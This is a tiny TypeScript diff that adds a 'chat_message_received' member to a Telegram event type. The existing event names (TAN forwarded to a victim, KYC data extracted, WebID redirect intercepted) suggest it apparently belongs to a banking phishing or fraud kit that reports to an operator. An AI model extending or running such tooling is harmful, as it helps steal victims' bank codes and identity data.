@@ -12,6 +12,7 @@ export type TelegramEvent =
   | "tan_forwarded_to_vic"
   | "kyc_data_extracted"
   | "webid_redirect_intercepted"
+  | "chat_message_received"
   | "test";
 
 interface Payload {
